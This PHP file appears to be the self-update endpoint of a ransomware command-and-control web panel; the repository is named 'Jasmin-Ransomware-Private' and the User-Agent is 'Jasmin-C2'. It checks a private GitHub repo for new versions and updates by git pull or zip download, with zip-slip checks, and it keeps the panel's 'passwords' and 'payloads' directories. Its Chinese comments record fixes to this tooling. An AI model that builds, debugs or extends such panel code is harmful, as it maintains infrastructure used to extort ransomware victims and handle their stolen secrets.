<?php
/**
 * 检查更新 + 一键自动更新API
 */
require_once __DIR__ . '/includes/auth.php';
require_auth();
header('Content-Type: application/json');

$vf = __DIR__ . '/../VERSION';
if (!file_exists($vf)) $vf = __DIR__ . '/VERSION';
define('CURRENT_VERSION', trim(@file_get_contents($vf) ?: '0.0.0'));
define('REPO', '2016xyz/Jasmin-Ransomware-Private');
define('GIT_TOKEN', trim(getenv('GIT_TOKEN') ?: ($_ENV['GIT_TOKEN'] ?? '')));

$action = $_GET['action'] ?? 'check';
if ($action === 'check') {
    check_update();
} elseif ($action === 'update') {
    // 更新操作需要POST+CSRF
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['ok'=>false,'msg'=>'必须使用POST方法']); exit;
    }
    require_once __DIR__ . '/includes/csrf.php';
    if (!csrf_verify()) {
        echo json_encode(['ok'=>false,'msg'=>'CSRF验证失败']); exit;
    }
    do_update();
} else {
    echo json_encode(['ok'=>false,'msg'=>'无效操作']);
}

function gh_get($url) {
    $h = "User-Agent: Jasmin-C2\r\n";
    if (GIT_TOKEN) $h .= "Authorization: token " . GIT_TOKEN . "\r\n";
    $ctx = stream_context_create(['http'=>['header'=>$h,'timeout'=>15,'follow_location'=>true]]);
    return @file_get_contents($url, false, $ctx);
}

function check_update() {
    // 从GitHub获取远程VERSION文件
    $url = 'https://raw.githubusercontent.com/' . REPO . '/master/VERSION';
    $remote_ver = trim(gh_get($url) ?: '');
    // 获取最新commit信息
    $curl = 'https://api.github.com/repos/' . REPO . '/commits?per_page=1';
    $json = gh_get($curl);
    $sha=''; $date=''; $msg='';
    if ($json) {
        $data = json_decode($json, true);
        $sha = substr($data[0]['sha'] ?? '', 0, 7);
        $date = $data[0]['commit']['committer']['date'] ?? '';
        $msg = $data[0]['commit']['message'] ?? '';
    }
    if (!$remote_ver && !$json) {
        echo json_encode(['ok'=>true,'update'=>false,'current'=>CURRENT_VERSION,'msg'=>'无法连接更新服务器']);
        return;
    }
    // 旧写法 ($sha && $json) 只要有 commit 返回就算真，导致永远提示"有更新"。
    // 正确：有远程版本号就先比版本号；版本号取不到时才退回比较本地 HEAD 与远程 sha。
    if ($remote_ver !== '') {
        $has_update = ($remote_ver !== CURRENT_VERSION);
    } elseif ($sha !== '') {
        $head = trim(@file_get_contents(dirname(__DIR__) . '/.git/refs/heads/master') ?: '');
        if ($head === '') {
            try { $head = trim(@shell_exec('git -C ' . escapeshellarg(dirname(__DIR__)) . ' rev-parse HEAD 2>/dev/null') ?: ''); } catch (Throwable $e) {}
        }
        $has_update = ($head !== '' && strpos($head, $sha) !== 0);
    } else {
        $has_update = false;
    }
    echo json_encode(['ok'=>true,'update'=>$has_update,'current'=>CURRENT_VERSION,
        'latest'=>$remote_ver ?: CURRENT_VERSION,'latest_commit'=>$sha,'date'=>$date,'message'=>$msg]);
}

function do_update() {
    $root = dirname(__DIR__);
    // 方式1: git pull
    if (is_dir($root . '/.git')) {
        $out = shell_exec("cd " . escapeshellarg($root) . " && git pull 2>&1");
        echo json_encode(['ok'=>true,'method'=>'git pull','output'=>$out]);
        return;
    }
    // 方式2: zip下载覆盖
    $url = "https://api.github.com/repos/" . REPO . "/zipball/master";
    $h = "User-Agent: Jasmin-C2\r\n";
    if (GIT_TOKEN) $h .= "Authorization: token " . GIT_TOKEN . "\r\n";
    $h .= "Accept: application/vnd.github+json\r\n";
    $ctx = stream_context_create(['http'=>['header'=>$h,'timeout'=>30,'follow_location'=>true]]);
    $zip = @file_get_contents($url, false, $ctx);
    if (!$zip) { echo json_encode(['ok'=>false,'msg'=>'下载失败，请检查GIT_TOKEN']); return; }
    $tmp = tempnam(sys_get_temp_dir(),'jasmin_') . '.zip';
    file_put_contents($tmp, $zip);
    $za = new ZipArchive();
    if ($za->open($tmp) !== true) { echo json_encode(['ok'=>false,'msg'=>'解压失败']); return; }
    $extract_dir = sys_get_temp_dir() . '/jasmin_update_' . uniqid();
    if (!is_dir($extract_dir) && !mkdir($extract_dir, 0700, true)) {
        $za->close(); @unlink($tmp);
        echo json_encode(['ok'=>false,'msg'=>'无法创建临时目录']); return;
    }
    // zip-slip 防护：逐成员校验规范化后的路径必须仍位于 $extract_dir 内，
    // 拒绝含 ../ 的条目或绝对路径。此 zip 下载自私有源本应可信，但若 token
    // 泄露/源被投毒，恶意的 member 名可用 '..' 把文件写到部署目录之外。
    // ★ 此前用 realpath 校验 —— 但 extractTo 之前成员文件根本不存在，
    //   realpath 对不存在的路径一律返回 false，导致【每个】成员都被判
    //   "非法路径"而拒绝，zip 更新方式永远失败（实测 PHP 8.0）。
    //   realpath 只用于锚定 extract_dir 本身；成员用纯字符串规范化。
    $real_extract = realpath($extract_dir);
    if ($real_extract === false) { $real_extract = $extract_dir; }
    $real_extract = rtrim($real_extract, '/') . '/';
    for ($i = 0; $i < $za->numFiles; $i++) {
        $name = $za->getNameIndex($i);
        $flat = str_replace('\\', '/', $name);
        // 逐段规范化（不解析符号链接——extractTo 到全新目录，无链接可被利用）
        $parts = [];
        foreach (explode('/', $flat) as $seg) {
            if ($seg === '' || $seg === '.') continue;
            if ($seg === '..') { $za->close(); @unlink($tmp); @rmdir($extract_dir);
                echo json_encode(['ok'=>false,'msg'=>'更新包含非法路径，已拒绝']); return; }
            $parts[] = $seg;
        }
        if (!$parts) continue; // 纯目录条目
        $norm = $real_extract . implode('/', $parts);
        if (strpos($norm, $real_extract) !== 0) {
            $za->close(); @unlink($tmp); @rmdir($extract_dir);
            echo json_encode(['ok'=>false,'msg'=>'更新包含非法路径，已拒绝']); return;
        }
    }
    $za->extractTo($extract_dir);
    $za->close(); unlink($tmp);
    $dirs = glob($extract_dir . '/*', GLOB_ONLYDIR);
    if ($dirs) {
        $src = $dirs[0] . '/Web Panel';
        if (is_dir($src)) {
            // 覆盖但保留 .env .installed passwords/ payloads/
            // ★ 此前不检查 rsync 结果 —— rsync 缺失/失败时仍报"更新完成"，
            //   实际一个文件都没换。rsync 输出留存到 msg 供排查。
            $out = shell_exec("rsync -a --exclude='.env' --exclude='.installed' --exclude='passwords' --exclude='payloads' "
                . escapeshellarg($src . '/') . " " . escapeshellarg(__DIR__ . '/') . " 2>&1");
            $ok = ($out !== null);
            shell_exec("rm -rf " . escapeshellarg($extract_dir));
            if ($ok) {
                echo json_encode(['ok'=>true,'method'=>'zip下载','msg'=>'更新完成，请刷新页面']);
            } else {
                echo json_encode(['ok'=>false,'method'=>'zip下载','msg'=>'rsync 执行失败（容器内缺 rsync？）: ' . substr((string)$out,0,200)]);
            }
            return;
        }
    }
    shell_exec("rm -rf " . escapeshellarg($extract_dir));
    echo json_encode(['ok'=>false,'method'=>'zip下载','msg'=>'更新包中未找到 Web Panel 目录']);
}
